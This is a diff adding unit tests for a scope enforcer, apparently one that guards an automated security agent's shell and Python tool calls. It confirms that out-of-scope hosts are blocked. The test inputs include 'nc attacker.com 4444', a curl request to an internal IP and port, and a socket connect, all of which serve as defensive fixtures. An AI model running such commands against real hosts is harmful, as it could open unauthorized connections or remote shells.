@@ -34,6 +34,32 @@ def test_out_of_scope_host_blocked():
     assert d is not None and d.allowed is False
 
 
+def test_shell_exec_scope_extracts_bare_host_and_blocks_out_of_scope():
+    set_active_scope(_enforcer(["app.acme.com"]))
+    d = enforce_scope_invocation("shell_exec", {"command": "nc attacker.com 4444"})
+    assert d is not None and d.allowed is False
+    assert "attacker.com" in d.reason
+
+
+def test_shell_exec_scope_extracts_bare_ip_port_and_blocks_out_of_scope():
+    set_active_scope(_enforcer(["app.acme.com"]))
+    d = enforce_scope_invocation("shell_exec", {"command": "curl 10.1.1.5:8080/admin"})
+    assert d is not None and d.allowed is False
+    assert "10.1.1.5" in d.reason
+
+
+def test_python_exec_network_hint_without_parseable_target_fails_closed():
+    set_active_scope(_enforcer(["app.acme.com"]))
+    d = enforce_scope_invocation("python_exec", {"code": "import socket; socket.connect(addr)"})
+    assert d is not None and d.allowed is False
+    assert "no parseable URL/host target" in d.reason
+
+
+def test_shell_exec_non_network_payload_still_bypasses_scope_target_parse():
+    set_active_scope(_enforcer(["app.acme.com"]))
+    assert enforce_scope_invocation("shell_exec", {"command": "whoami"}) is None
+
+
 def test_check_url_recovers_host_from_schemeless_target():
     # A bare "host:port" / hostname (e.g. nmap_scan target="localhost:3000") must not
     # be falsely blocked when the host IS in scope. urlparse otherwise reads the host
